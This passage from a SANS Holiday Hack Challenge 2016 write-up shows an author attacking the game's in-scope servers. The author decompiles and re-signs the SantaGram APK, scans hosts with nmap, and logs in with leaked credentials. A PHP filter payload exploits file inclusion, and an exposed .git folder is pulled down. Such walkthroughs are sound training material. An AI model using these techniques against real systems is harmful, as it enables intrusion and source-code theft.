res/values/strings.xml:    <string name="exhandler_url">http://ex.northpolewonderland.com/exception.php</string>
```

Bingo. Now we got some domain names that line up with our task for Part 4. Let's resolve these to domain names and get the Oracles approval. Some more command line Kung Fu gets us a clean list of domain names with IPs.

```shell
$ for d in `grep -r -E https?:// * | grep northpolewonderland\.com | cut -d'/' -f5`; do dig $d | grep IN | grep -E "\d+\.\d+\.\d+\.\d+"; done
analytics.northpolewonderland.com. 1283 IN A 104.198.252.157
analytics.northpolewonderland.com. 1282 IN A 104.198.252.157
ads.northpolewonderland.com. 1282 IN A 104.198.221.240
dev.northpolewonderland.com. 1171 IN A 35.184.63.245
dungeon.northpolewonderland.com. 1282 IN A 35.184.47.139
ex.northpolewonderland.com. 1282 IN A 104.154.196.33
```

Talking to Tom Hessman aka "The Oracle", we get approval for all 5 IP addresses above. We go ahead and throw in the IP address for www.northpolewonderland.com and get told its in scope but only for downloading files, so that is reassuring.

I will tackle each server in the ordered listed in the task. Assuming they get more difficult as we go, and the order of the audio files might be important.

#### The Mobile Analytics Server (via credentialed login access)

The URL is `analytics.northpolewonderland.com` which has an IP address of `104.198.252.157`. We see above that there is a `report.php` file in the webroot, but the page is access via `https`. Lets see what we can do in our browser to this page.

![Analytics Login](../assets/images/holidayhack2016/analytics_login.png)

The webroot resolves to a `login.php` page. Using the credentials from the APK from in Part 2 {`guest`:`busyreindeer78`}, we are able to reach the home page.

![Analytics Success](../assets/images/holidayhack2016/analytics_success.png)

The top of the page we see a link to `MP3`. We can click this link and download the file directly. We also can use the following python requests script to automate the entire process.

```python
import requests
from bs4 import BeautifulSoup

url = "https://analytics.northpolewonderland.com"
s = requests.Session()

data = {'username':'guest','password':'busyreindeer78'}
r = s.post(url + '/login.php', data=data)
cookies = s.cookies

soup = BeautifulSoup(r.text)

mp3 = [a.get('href') for a in soup.find_all('a', href=True) if 'MP3' in a][0]
audio = s.get(url + mp3, cookies=cookies)
filename = audio.headers['content-disposition'].split('=')[1]

with open(filename, 'wb') as output:
    for chunk in audio.iter_content(chunk_size=1024):
        if chunk:
             output.write(chunk)

print "Download: %s from %s%s" % (filename, url, mp3)
```

The name of the downloaded file is: `discombobulatedaudio2.mp3`

#### The Dungeon Game

The Dungeon server URL is `dungeon.northpolewonderland.com` with an IP address of `35.184.47.139`. Visiting the above URL we are presented with a static website with instructions for the Dungeon game.

![Dungeon Instructions](../assets/images/holidayhack2016/dungeon_instructions.png)

An elf in the north pole previously provided a link to download the binary for the dungeon game [here](http://www.northpolewonderland.com/dungeon.zip). We can assume the binary is running as a service on this host. Lets fire up `nmap` to see if its is listening on any odd ports.

```shell
$ nmap 35.184.47.139

Starting Nmap 7.01 ( https://nmap.org ) at 2016-12-23 14:06 EST
Nmap scan report for 139.47.184.35.bc.googleusercontent.com (35.184.47.139)
Host is up (0.064s latency).
Not shown: 994 closed ports
PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
80/tcp    open  http
554/tcp   open  rtsp
7070/tcp  open  realserver
11111/tcp open  vce
```

Checking to see what is going on at TCP port `11111`, we see that as expected it's the dungeon game. Playing it a little we find a leaflet describing the game.

Our mission is to find the elf at the North Pole and barter with him for information about holiday artifacts you need to complete your quest.
As you enter the forest in the game, you find a tall tree. You climb up the tree to recover a jewel encrusted egg. Enter the house, explore the rooms, find a sword and a lamp. In one of the rooms a trap door can be found under a heavy rug. Enter the dungeon, explore, avoid the thief, kill a troll, and find the elf. Give the elf the egg and he gives you the following message.

>>The elf, satisfied with the trade says -
send email to “peppermint@northpolewonderland.com” for that which you seek. The elf says - you have conquered this challenge - the game will now end

After sending the email, peppermint sends back a message with an audio file attached. The message says:

>>You tracked me down, of that I have no doubt.
I won't get upset, to avoid the inevitable bout.
You have what you came for, attached to this note.
Now go and catch your villian, and we will alike do dote.

The name of the attached file is:  `discombobulatedaudio3.mp3`

#### The Debug Server

The debug server domain name is `dev.northpolewonderland.com` and the IP address is `35.184.63.245`. There is an `index.php` file at the webroot. Opening up that URL in our web-browser returns a blank page. Let's dive into the *SantaGram* app source code to see what is going on here.

There is a couple of approaches we can take here. We could deploy the APK into an Android development tool like *Genymotion* or we could do some searching into the source code. We  will start with the source code first. Using command line tools again, we will look for any mention of the phase `debug`. Below you can see we get an indication of something going on in the `EditProfile.java` file. Seems it checks if remote debugging is enabled or not.

```shell
$ grep -ir "debug" *
android/support/v7/view/menu/C0656h.java:import android.view.ViewDebug.CapturedViewProperty;
android/support/v7/widget/ActionMenuView.java:import android.view.ViewDebug.ExportedProperty;
com/northpolewonderland/santagram/C0987b.java:import android.os.Debug;
com/northpolewonderland/santagram/C0987b.java:            jSONObject2.put("natallocmem", String.valueOf(Debug.getNativeHeapAllocatedSize()));
com/northpolewonderland/santagram/EditProfile.java:            Log.i(getString(2131165204), "Remote debug logging is Enabled");
com/northpolewonderland/santagram/EditProfile.java:            Log.i(getString(2131165204), "Remote debug logging is Disabled");
com/northpolewonderland/santagram/EditProfile.java:                jSONObject.put("debug", getClass().getCanonicalName() + ", " + getClass().getSimpleName());
com/northpolewonderland/santagram/EditProfile.java:                Log.e(getString(2131165204), "Error posting JSON debug data: " + e.getMessage());
com/northpolewonderland/santagram/SplashScreen.java:import android.os.Debug;
com/northpolewonderland/santagram/SplashScreen.java:            jSONObject2.put("natallocmem", String.valueOf(Debug.getNativeHeapAllocatedSize()));
com/parse/Parse.java:    public static final int LOG_LEVEL_DEBUG = 3;
com/parse/Parse.java:        String[] strArr = new String[LOG_LEVEL_DEBUG];
res/values/public.xml:    <public type="string" name="debug_data_collection_url" id="0x7f07001d" />
res/values/public.xml:    <public type="string" name="debug_data_enabled" id="0x7f07001e" />
res/values/strings.xml:    <string name="debug_data_collection_url">http://dev.northpolewonderland.com/index.php</string>
res/values/strings.xml:    <string name="debug_data_enabled">false</string>
```

The full file can be seen [here](https://github.com/wcmoody/holidayhack/blob/master/EditProfile.java). But let's look at the `onCreate()` function to see what is going on.

```java
    protected void onCreate(Bundle bundle) {
        boolean z;
        super.onCreate(bundle);
        setContentView(2130968618);
        super.setRequestedOrientation(1);
        C0987b.m4774a(getApplicationContext(), getClass().getSimpleName());
        if (getString(2131165214).equals("true")) {
            Log.i(getString(2131165204), "Remote debug logging is Enabled");
            z = true;
        } else {
            Log.i(getString(2131165204), "Remote debug logging is Disabled");
            z = false;
        }
        getSupportActionBar().m2632a(true);
        getSupportActionBar().m2636b(true);
        getSupportActionBar().m2631a((CharSequence) "Edit Profile");
        this.f2420a = new ProgressDialog(this);
        this.f2420a.setTitle(2131165208);
        this.f2420a.setIndeterminate(false);
        if (z) {
            try {
                JSONObject jSONObject = new JSONObject();
                jSONObject.put("date", new SimpleDateFormat("yyyyMMddHHmmssZ").format(Calendar.getInstance().getTime()));
                jSONObject.put("udid", Secure.getString(getContentResolver(), "android_id"));
                jSONObject.put("debug", getClass().getCanonicalName() + ", " + getClass().getSimpleName());
                jSONObject.put("freemem", Runtime.getRuntime().totalMemory() - Runtime.getRuntime().freeMemory());
                new Thread(new C08591(this, jSONObject)).start();
            } catch (Exception e) {
                Log.e(getString(2131165204), "Error posting JSON debug data: " + e.getMessage());
            }
        }
        ImageView imageView = (ImageView) findViewById(2131558535);
        ParseFile parseFile = (ParseFile) this.f2421b.get(Configs.USER_AVATAR);
        if (parseFile != null) {
            parseFile.getDataInBackground(new C08602(this, imageView));
        }
        imageView.setOnClickListener(new C08613(this));
        imageView = (ImageView) findViewById(2131558537);
        parseFile = (ParseFile) this.f2421b.get(Configs.USER_COVER_IMAGE);
        if (parseFile != null) {
            parseFile.getDataInBackground(new C08624(this, imageView));
        }
        imageView.setOnClickListener(new C08635(this));
        TextView textView = (TextView) findViewById(2131558540);
        textView.setText(this.f2421b.getString(Configs.USER_FULLNAME));
        TextView textView2 = (TextView) findViewById(2131558542);
        textView2.setText(this.f2421b.getString(Configs.USER_ABOUT_ME));
        ((TextView) findViewById(2131558544)).setText(this.f2421b.getString(Configs.USER_EMAIL));
        ((Button) findViewById(2131558545)).setOnClickListener(new C08656(this, textView, textView2));
    }
```

The code tests if a certain string is `true` or `false` and logs if debug mode is enabled. If debugging mode is enabled, a JSON object with a `date`, `udid`, `debug` and `freemem` key is created. This JSON object is then passed to an unknown thread. This thread could possible be a URL connection to the the debug server. Assuming that, lets create a JSON object and send it to the server.

```python
In [1]: import requests

In [2]: import json

In [3]: url = "http://dev.northpolewonderland.com/index.php"

In [4]: s = requests.Session()

In [5]: data = {'date':'insert-date', 'udid':'insert-udid', 'debug':'debug-here', 'freemem':'freemem-here'}

In [6]: print s.post(url, data=json.dumps(data)).text
```

Still nothing. Lets look closer at the source code. It appears there are some specific formats to the values in the JSON.  We could try and discover what the Java code is creating, but lets go to the Android app and make it submit a debug report.

We can use the recommendation from Josh Wright's video of using `apktool` disassemble APK files into `smali` files in order to make search for important strings and to changes. We want to search for information about the `EditProfile.java` file. We first search for the URL and discover the nickname  of `debug_data_collection_url` is associated to that URL. That nickname is linked to the id `0x7f0f001d`. Looking for `0x7f07001d` in the smali files we see it is found in `smali/com/northpolewonderland/santagram/EditProfile$1.smali`.

```shell

$ grep -Ir dev.northpolewonderland.com *
res/values/strings.xml: <string name="debug_data_collection_url">http://dev.northpolewonderland.com/index.php</string>

$ grep -Ir debug_data_collection_url *
res/values/public.xml: <public type="string" name="debug_data_collection_url" id="0x7f07001d">
res/values/strings.xml: <string name="debug_data_collection_url">http://dev.northpolewonderland.com/index.php</string>

$ grep -Ir 0x7f07001d *
res/values/public.xml: <public type="string" name="debug_data_collection_url" id="0x7f07001d">
smali/com/northpolewonderland/santagram/EditProfile$1.smali: const v1, 0x7f07001d
```

So when we see reference to v1 in `EditProfile$1.smali` we know it refers to the URL for the debug server. This confirms our assumptions that `EditProfile.java` is creating the JSON object being sent to the debug server.

Above when searching for `debug` in the source, we see mention of an object in the `res/values/string.xml` file with name of `debug_data_enabled` and value as `false`. If we change this value to true and recompile the application, we can have a version of *SantaGram* app that submits bug reports. Following the instructions from the video recommend by **Bushy Evergreen**, we can compile and sign our edited version of *SantaGram*.

Edit the `strings.xml` file and confirming our changes.

```shell
$ grep false SantaGram_4.2/res/values/strings.xml
<string name="debug_data_enabled">false</string>

$ sed -i -e 's/"debug_data_enabled">false/"debug_data_enabled">true/g' SantaGram_4.2/res/values/strings.xml

$ grep true SantaGram_4.2/res/values/strings.xml
<string name="debug_data_enabled">true</string>
```

Recompile SantaGram application using `apktool`

```shell
$ apktool b SantaGram_4.2
I: Using Apktool 2.2.1
I: Checking whether sources has changed...
I: Checking whether resources has changed...
I: Building resources...
I: Building apk file...
I: Copying unknown files/dir...
```
Create a keystore and use it to sign the newly built hacked version of the SantaGram APK

```shell
$ $JAVA_HOME/bin/keytool -genkey -v -keystore keys/santagram.keystore -alias SantaGram -keyalg RSA -keysize 1024 -sigalg SHA1withRSA -validity 10000
Enter keystore password:
Re-enter new password:
What is your first and last name?
[Unknown]:
What is the name of your organizational unit?
[Unknown]:
What is the name of your organization?
[Unknown]:
What is the name of your City or Locality?
[Unknown]:
What is the name of your State or Province?
[Unknown]:
What is the two-letter country code for this unit?
[Unknown]:
Is CN=Unknown, OU=Unknown, O=Unknown, L=Unknown, ST=Unknown, C=Unknown correct?
[no]: yes

Generating 1,024 bit RSA key pair and self-signed certificate (SHA1withRSA) with a validity of 10,000 days
for: CN=Unknown, OU=Unknown, O=Unknown, L=Unknown, ST=Unknown, C=Unknown
Enter key password for <SantaGram>
(RETURN if same as keystore password):
[Storing keys/santagram.keystore]

$ $JAVA_HOME/bin/jarsigner -keystore keys/SantaGram.keystore SantaGram_4.2/dist/SantaGram_4.2.apk -sigalg SHA1withRSA -digestalg SHA1 SantaGram
Enter Passphrase for keystore:
jar signed.

Warning:
No -tsa or -tsacert is provided and this jar is not timestamped. Without a timestamp, users may not be able to validate this jar after the signer certificate's expiration date (2044-05-11) or after any future revocation date.
```

We now have working version of the SantaGram app that we can open up in an Android emulator. I use the awesome free version of the [Genymotion](https://www.genymotion.com). Just drag and drop the newly signed APK file in the emulated phone home screen to install and run. (note: I had a problem with an early API version of an Android device, I found that API version 24 would works.

After a very quick SantaGram Splash Screen, we are presented with a login page. Click the `Need an Account` link to sign up for a link. No email confirmation is needed so just type whatever you want. Once you are logged in you will see your home page and a list of your empty list of accounts you are following. You can search for other users and see their photos. Most of the elves in the North Pole have accounts with either holiday pictures or screen captures of their penetration testing work (i.e. more hints).

![SantaGram Create Account](../assets/images/holidayhack2016/santagram_combine_1.png)

![SantaGram Create Account](../assets/images/holidayhack2016/santagram_combine_2.png)

 
Clicking on the icon labeled `Me` at the bottom takes us to our account profile page. You will see two buttons on the right labeled `Activity` and `Edit Profile.` 

![Edit Program](../assets/images/holidayhack2016/santagram_editprofile.png)

We are assuming that communications with the debug server is going to start when we click the `Edit Profile` button. I start `wireshark` capturing all traffic on my network traffic since `Genymotion` uses the `VirtualBox` instance on my laptop to communicate with the debug server. I apply a filter to only display traffic with a source or destination IP address of the debug server. Clicking the `Edit Profile` button takes me to the following screen and I see the below traffic in `wireshark`.

![Wireshark Capture](../assets/images/holidayhack2016/wireshark_debug.png)

In the first packet sent from SantaGram to the debug server, after the TCP 3-way handshake, is an JSON object with the name and values which we expected. The server send back a couple of packets so we will look at the entire stream. In Wireshark, choose Analyze - Follow - TCP Steam. Below is that output.

![Wiresharek Follow TCP](../assets/images/holidayhack2016/wireshark_followtcp_debug.png)

The red portion is traffic sent by the Application to the Debug server, the blue is the response. The posted JSON object has all the fields that we saw in the `EditProfile.java` source code. The reply object has a `date`, `status`, `filename`, and `request` field. The request field is another JSON object with our posted object fields except it has one additional field. The additional name/value pair is `"verbose":false`. It appears if the object does not have a verbose field it defaults to false. Let's use our `python` script to send the same JSON object above but with the verbose field set to true.

```python
In [7]: data = {
    "date":"20161224122717-0500",
    "udid":"bc651a8e3fc7d417",
    "debug":"com.northpolewonderland.santagram.EditProfile, EditProfile",
    "freemem":68854400
}

In [8]: data["verbose"] = True

In [9]: print s.post(url, data=json.dumps(data)).text
{"date":"20161224204103",
"date.len":14,
"status":"OK",
"status.len":"2",
"filename":"debug-20161224204103-0.txt",
"filename.len":26,
"request":{
          "date":"201612241227170500",
          "udid":"bc651a8e3fc7d417",
          "freemem":68854400,
          "debug":"com.northpolewonderland.santagram.EditProfile, EditProfile",
          "verbose":true
},
"files":["debug-20161224203052-0.txt",
         "debug-20161224203130-0.txt",
         "debug-20161224203151-0.txt",
         "debug-20161224203159-0.txt",
         "debug-20161224203349-0.txt",
         "debug-20161224203556-0.txt",
         "debug-20161224203612-0.txt",
         "debug-20161224203642-0.txt",
         "debug-20161224204103-0.txt",
         "debug-20161224235959-0.mp3",
         "index.php"]
}
```

Our output now has many more name-value pairs, including a pair called files with a list of files. One such file is called `debug-20161224235959-0.mp3`. This appears to be the audio file we need. Firing up `wget`, we can pull this down from the file straight off the webroot on the debug server.

```shell
wget http://dev.northpolewonderland.com/debug-20161224235959-0.mp3
--2016-12-24 15:43:56-- http://dev.northpolewonderland.com/debug-20161224235959-0.mp3
Resolving dev.northpolewonderland.com... 35.184.63.245
Connecting to dev.northpolewonderland.com|35.184.63.245|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 218033 (213K) [audio/mpeg]
Saving to: 'debug-20161224235959-0.mp3'

debug-20161224235959-0.mp3 100%[================================================>] 212.92K 550KB/s in 0.4s

2016-12-24 15:43:57 (550 KB/s) - 'debug-20161224235959-0.mp3' saved [218033/218033]
```

The name implies it was recorded at one second before Christmas Day 2016. The name of the downloaded file is ``debug-20161224235959-0.mp3

#### The Banner Ad Server

The next target is the Banner Ad Server. The domain name of the server is `ads.northpolewonderland.com` and the IP address is `104.198.221.240`. According to our source code there is a folder and file called `affiliate/C9E380C8-2244-41E3-93A3-D6C6700156A5` in the webroot.

Going to this file on the server provides a rotating series of banner advertisements as shown at the bottom of the *SantaGram* app. A set of these were provided as hints before the release of the SANS Holiday Hack Challenge. Continuously going to this URL I pulled the following 5 banner ads.

![Candy Cane Farm](../assets/images/holidayhack2016/candycanefarm.jpeg)
![Christmas Light Repair](../assets/images/holidayhack2016/christmaslightrepair.jpeg)
![Denistry](../assets/images/holidayhack2016/denistry.jpeg)
![Reindeer Cleanup](../assets/images/holidayhack2016/reindeercleanup.jpeg)
![Snow Removal](../assets/images/holidayhack2016/snowremoval.jpeg)
 
I checked out the root website at that domain name to find the homepage for a service called `Ad Nauseam`. This is the home page for the server that provides advertisements that help fund the free usage of *SantaGram*.

![Ad Nauseum Home](../assets/images/holidayhack2016/ad_nauseam.png)

The quick view of the source code for this page indicates its build around the `Meteor` framework. This lines up with a recent [blog](https://pen-testing.sans.org/blog/2016/12/06/mining-meteor) at the SANS Pentest Website mentioned by the elf in Santa's workshop named **Pepper Mintstix**. This blog discusses how to mine a Meteor website for information leakage. It provides a link to [Tim Medin's github](https://github.com/nidem/MeteorMiner) site to a [TamperMonkey](https://tampermonkey.net/) script called `MeteorMiner`. Installing this add-on and script into my Chrome browser, provides a interesting toolbar to show you the various Meteor objects for the site.

![Meteor Miner Enabled](../assets/images/holidayhack2016/meteor_miner_home.png)

Taking note of what is available, I begin to dig around the ad server website. When I get to the `/admin/quotes` route, I notice that the `HomeQuotes` collection now has 5 records when it initially had 4. Clicking on the records, I see the new record has an audio field.

![HomeQuotes Colletion](../assets/images/holidayhack2016/ad_homequotes_collections.png)

Using the tip from the blog of using the `JavaScript` console to access the data in the collection, I run the command `HomeQuotes.find().fetch()` to see the array of the objects. Viewing the last object in the array, we see the audio field has a URL.

![Ad Server Exploit](../assets/images/holidayhack2016/ad_server_exploit.png)

Accessing the url `/ofdAR4UYRaeNxMg/discombobulatedaudio5.mp3`, I am able to download the 5th audio file.

The name of the downloaded file is: `discombobulatedaudio5.mp3`

#### The Uncaught Exception Handler Server

The exception handler server has a domain name of ex.northpolewonderland.com. and an IP address of 104.154.196.33. There is a page in the webroot called exception.php. Let's go back to iPython and interact with this server.

```python
In [1]: import requests

In [2]: url = "http://ex.northpolewonderland.com/exception.php"

In [3]: s = requests.Session()

In [4]: s.get(url).text
Out[4]: u'Request method must be POST\n'

In [5]: headers = {"Content-Type":"application/json"}

In [6]: s.post(url,headers=headers).text
Out[6]: u'POST contains invalid JSON!\n'

In [7]: import json

In [8]: data = json.dumps({})

In [9]: s.post(url,headers=headers,data=data).text
Out[9]: u"Fatal error! JSON key 'operation' must be set to WriteCrashDump or ReadCrashDump.\n"
```

So the error codes are helping us out here. We learn the following just by interacting with the overly verbose server:

* GET requests not allowed, only POST request
* The Content-Type in the HTTP header must be set to application/json
* We must submit a JSON object as the POST data
*Our JSON object must have a key of 'operation' that needs to have a value of either WriteCrashDump or ReadCrashDump

This tell us a few things. We appear to have the ability to write information to the system and the ability to potentially be able to read back what we wrote. We also have some pretty specific phrases (`WriteCrashDump` and `ReadCrashDump`) to search for in our source code. Let's look for those phrases

```shell
$ grep -IEr CrashDump *
com/northpolewonderland/santagram/C0987b.java: jSONObject.put("operation", "WriteCrashDump");
com/northpolewonderland/santagram/SplashScreen.java: jSONObject.put("operation", "WriteCrashDump");
```

This reveals there is no mention of the reading crash dumps, but we create the JSON object with the operation of `WriteCrashDump` in the `SplashScreen.java` code (along with the obfuscated `C0987b.java` file).

The entire `SplashScreen.java` file can be found [here](https://github.com/wcmoody/holidayhack/blob/master/SplashScreen.java) but below is the important code about the `WriteCrashDump` JSON object.

```java
private void postExceptionData(Throwable th) {
JSONObject jSONObject = new JSONObject();
Log.i(getString(2131165204), "Exception: sending exception data to " + getString(2131165216));
try {
    jSONObject.put("operation", "WriteCrashDump");
    JSONObject jSONObject2 = new JSONObject();
    jSONObject2.put("message", th.getMessage());
    jSONObject2.put("lmessage", th.getLocalizedMessage());
    jSONObject2.put("strace", Log.getStackTraceString(th));
    jSONObject2.put("model", Build.MODEL);
    jSONObject2.put("sdkint", String.valueOf(VERSION.SDK_INT));
    jSONObject2.put("device", Build.DEVICE);
    jSONObject2.put("product", Build.PRODUCT);
    jSONObject2.put("lversion", System.getProperty("os.version"));
    jSONObject2.put("vmheapsz", String.valueOf(Runtime.getRuntime().totalMemory()));
    jSONObject2.put("vmallocmem", String.valueOf(Runtime.getRuntime().totalMemory() - Runtime.getRuntime().freeMemory()));
    jSONObject2.put("vmheapszlimit", String.valueOf(Runtime.getRuntime().maxMemory()));
    jSONObject2.put("natallocmem", String.valueOf(Debug.getNativeHeapAllocatedSize()));
    jSONObject2.put("cpuusage", String.valueOf(cpuUsage()));
    jSONObject2.put("totalstor", String.valueOf(totalStorage()));
    jSONObject2.put("freestor", String.valueOf(freeStorage()));
    jSONObject2.put("busystor", String.valueOf(busyStorage()));
    jSONObject2.put("udid", Secure.getString(getContentResolver(), "android_id"));
    jSONObject.put("data", jSONObject2);
    new Thread(new C09834(this, jSONObject)).start();
} catch (JSONException e) {
    Log.e(TAG, "Error posting message to " + getString(2131165216) + " -- " + e.getMessage());
}
}
```

This shows a JSON object is created with the `operation` key and another key called `data` where the value is a second JSON object with various system status for apparently when a crash occurs. Going back to `iPython`, lets add this data object and see what happens.

```python
In [10]: writeDump = {}

In [11]: writeDump['operation'] = "WriteCrashDump"

In [12]: writeDump['data'] = {"udid":"what?"}

In [13]: data = json.dumps(writeDump)

In [14]: print s.post(url,headers=headers,data=data).text

{
"success" : true,
"folder" : "docs",
"crashdump" : "crashdump-lCpUot.php"
}
```

So we have successfully written a crash dump with minimal information to the server. We now will try to develop a method to read it back. Once we have a working system, we will then attempt to exploit it.

```python
In [15]: readDump = {}

In [16]: readDump['operation'] = "ReadCrashDump"

In [17]: data = json.dumps(readDump)

In [18]: s.post(url,headers=headers,data=data).text
Out[18]: u"Fatal error! JSON key 'data' must be set.\n"
```

We will assume that the data key will have a value that is another JSON object. Adding an empty JSON object, we get the following:

```python
In [19]: readDump['data'] = {}

In [20]: data = json.dumps(readDump)

In [21]: s.post(url,headers=headers,data=data).text
Out[21]: u"Fatal error! JSON key 'crashdump' must be set.\n"
```

So one of the two JSON object needs a key of 'crashdump', we will add it to the inner object with an empty string as the value.

```python
In [22]: readDump['data'] = {"crashdump":" "}

In [23]: data = json.dumps(readDump)

In [24]: data
Out[24]: '{"operation": "ReadCrashDump", "data": {"crashdump": ""}}'

In [25]: s.post(url,headers=headers,data=data).text
Out[25]: u''
```

That is a good sign as we got no errors. We now will try to read back the crash dump we posted earlier. The returned JSON object from the write operation had a key of `crashdump` with a value of `crashdump-lCpUot.php`. We will use this file name as crashdump value in our inner JSON object.

```python
In [26]: readDump['data'] = {"crashdump":"crashdump-lCpUot.php"}

In [27]: data = json.dumps(readDump)

In [28]: s.post(url,headers=headers,data=data).text
Out[28]: u"Fatal error! crashdump value duplicate '.php' extension detected.\n"
```

It appears the exception server does not like the `.php` file extension to be in `crashdump key`. Cleaning that up:

```python
In [29]: readDump['data'] = {"crashdump":"crashdump-lCpUot"}

In [30]: data = json.dumps(readDump)

In [31]: print s.post(url,headers=headers,data=data).text
{
 "udid": "what?"
}
```

I tell you what I did... I just revealed your vulnerability. So when writing an crash dump, the system creates a `php` file that we then can retrieve with the read crash dump operation. Assuming this php file is not directly accessible from the webroot, it must be used in an include operation inside of exception.php. Let's test this out:

```shell
$ wget http://ex.northpolewonderland.com/crashdump-lCpUot.php
--2016-12-26 07:50:22-- http://ex.northpolewonderland.com/crashdump-lCpUot.php
Resolving ex.northpolewonderland.com... 104.154.196.33
Connecting to ex.northpolewonderland.com|104.154.196.33|:80... connected.
HTTP request sent, awaiting response... 404 Not Found
2016-12-26 07:50:22 ERROR 404: Not Found.
```

Another recent SANS Pentest [blog](https://pen-testing.sans.org/blog/2016/12/07/getting-moar-value-out-of-php-local-file-include-vulnerabilities) post by Jeff McJunkin discusses exploiting local file inclusion vulnerabilities in PHP using the `php:// filter`. The recommended payload from the article is:

>>page=php://filter/convert.base64-encode/resource=index

This situation arises when PHP code expects to have a POST or GET parameter called `page` equal to a file name that will have `.php` appended to and included in the execution to generate the output. If vulnerable the value returned from the above would be the base64 encoded source code of the `index.php` file. We will tweak this payload to get the source code of `exception.php` and pass this as the `crashdump` value in our inner JSON object.

```python
In [32]: lfi = "php://filter/convert.base64-encode/resource=exception"

In [33]: readDump['data'] = {"crashdump":lfi}

In [34]: data = json.dumps(readDump)

In [35]: s.post(url,headers=headers,data=data).text
Out[35]: u'PD9waHAgCgojIEF1ZGlvIGZpbGUgZnJvbSBEaXNjb21ib2J1bGF0b3IgaW4gd2Vicm9vdDogZGlzY29tYm9idWxhdGVkLWF1ZGlvLTYtWHl6RTNOOVlxS05ILm1wMwoKIyBDb2RlIGZyb20gaHR0cDovL3RoaXNpbnRlcmVzdHNtZS5jb20vcmVjZWl2aW5nLWpzb24tcG9zdC1kYXRhLXZpYS1waHAvCiMgTWFrZSBzdXJlIHRoYXQgaXQgaXMgYSBQT1NUIHJlcXVlc3QuCmlmKHN0cmNhc2VjbXAoJF9TRVJWRVJbJ1JFUVVFU1RfTUVUSE9EJ10sICdQT1NUJykgIT0gMCl7CiAgICBkaWUoIlJlcXVlc3QgbWV0aG9kIG11c3QgYmUgUE9TVFxuIik7Cn0KCSAKIyBNYWtlIHN1cmUgdGhhdCB0aGUgY2 .......
```

Boom! Now we will just decode that output and see what we have:

```python
In [36]: print s.post(url,headers=headers,data=data).text.decode('base64')
<?php

# Audio file from Discombobulator in webroot: discombobulated-audio-6-XyzE3N9YqKNH.mp3

# Code from http://thisinterestsme.com/receiving-json-post-data-via-php/
# Make sure that it is a POST request.
if(strcasecmp($_SERVER['REQUEST_METHOD'], 'POST') != 0){
    die("Request method must be POST\n");
}
.....
```

I only show the first few lines, since the audio file is listed write above, but the entire file can be shown [here](https://github.com/wcmoody/holidayhack/blob/master/exception.php).

So the audio file is located in the webroot at `discombobulated-audio-6-XyzE3N9YqKNH.mp3`. Downloading it with wget, we now have 6 of the 7 audio files.

```shell
$ wget http://ex.northpolewonderland.com/discombobulated-audio-6-XyzE3N9YqKNH.mp3
--2016-12-26 08:13:44-- http://ex.northpolewonderland.com/discombobulated-audio-6-XyzE3N9YqKNH.mp3
Resolving ex.northpolewonderland.com... 104.154.196.33
Connecting to ex.northpolewonderland.com|104.154.196.33|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 223244 (218K) [audio/mpeg]
Saving to: 'discombobulated-audio-6-XyzE3N9YqKNH.mp3'

discombobulated-audio-6-X 100%[======================================>] 218.01K 958KB/s in 0.2s

2016-12-26 08:13:45 (958 KB/s) - 'discombobulated-audio-6-XyzE3N9YqKNH.mp3' saved [223244/223244]
```

The name of the download file is `discombobulated-audio-6-XyzE3N9YqKNH.mp3`

#### The Mobile Analytics Server (post authentication)

Returning to the Analytics Server, I know I have to exploit another audio file from this site. When I had initially targeted this server, I had conducted a nmap scan to attempt to enumerate the website. The results can be seen below:

```shell
$ nmap --script=http-enum 104.198.252.157

Starting Nmap 7.01 ( https://nmap.org ) at 2016-12-29 15:25 EST
Nmap scan report for 157.252.198.104.bc.googleusercontent.com (104.198.252.157)
Host is up (0.067s latency).
Not shown: 995 filtered ports
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
443/tcp  open  https
| http-enum:
|   /login.php: Possible admin folder
|_  /.git/HEAD: Git folder
554/tcp  open  rtsp
7070/tcp open  realserver

Nmap done: 1 IP address (1 host up) scanned in 37.31 seconds
```

Knowing that you probably should not leave your `git` files on your web server, browsed to this URL to see what was there. Sure enough, all the hidden git files. Using the techniques outlined on this [blog](https://en.internetwache.org/dont-publicly-expose-git-or-how-we-downloaded-your-websites-sourcecode-an-analysis-of-alexas-1m-28-07-2015/), I was able to automate the downloading of the entire `git` directory and restore the files. This gave me full source code for the website along with revision history.

```
$ ls -la
total 84
drwxr-xr-x 27 Owner staff  918 Dec 29 20:27 .
drwxr-xr-x 15 Owner staff  510 Dec 29 21:29 ..
drwxr-xr-x 14 Owner staff  476 Dec 29 22:01 .git
-rw-r--r--  1 Owner staff  310 Dec 28 22:37 README.md
-rw-r--r--  1 Owner staff  290 Dec 28 22:37 crypto.php
drwxr-xr-x 11 Owner staff  374 Dec 28 22:37 css
-rw-r--r--  1 Owner staff 2958 Dec 28 22:37 db.php
-rw-r--r--  1 Owner staff 2392 Dec 28 22:37 edit.php
drwxr-xr-x  7 Owner staff  238 Dec 28 22:37 fonts
-rw-r--r--  1 Owner staff   29 Dec 28 22:37 footer.php
-rw-r--r--  1 Owner staff  935 Dec 29 20:16 functions.php
-rw-r--r--  1 Owner staff 1191 Dec 28 22:37 getaudio.php
-rw-r--r--  1 Owner staff 2000 Dec 28 22:37 header.php
-rw-r--r--  1 Owner staff  819 Dec 28 22:37 index.php
drwxr-xr-x  5 Owner staff  170 Dec 28 22:37 js
-rw-r--r--  1 Owner staff 2913 Dec 28 22:37 login.php
-rw-r--r--  1 Owner staff  174 Dec 28 22:37 logout.php
-rw-r--r--  1 Owner staff  325 Dec 28 22:37 mp3.php
drwxr-xr-x  3 Owner staff  102 Dec 29 20:13 out
-rw-r--r--  1 Owner staff 7697 Dec 28 22:37 query.php
-rw-r--r--  1 Owner staff 2252 Dec 28 22:37 report.php
-rw-r--r--  1 Owner staff 5008 Dec 28 22:37 sprusage.sql
drwxr-xr-x  5 Owner staff  170 Dec 28 22:37 test
-rw-r--r--  1 Owner staff  629 Dec 28 22:37 this_is_html.php
-rw-r--r--  1 Owner staff  739 Dec 28 22:37 this_is_json.php
-rw-r--r--  1 Owner staff  647 Dec 28 22:37 uuid.php
-rw-r--r--  1 Owner staff 1949 Dec 28 22:37 view.php
```

The first thing I wanted to look at was the `sprusage.sql` file. It was the `sql` commands used to create the database for the site. Tables of interest initially were the `audio` and `users` table. I saw no inserts into either table though.

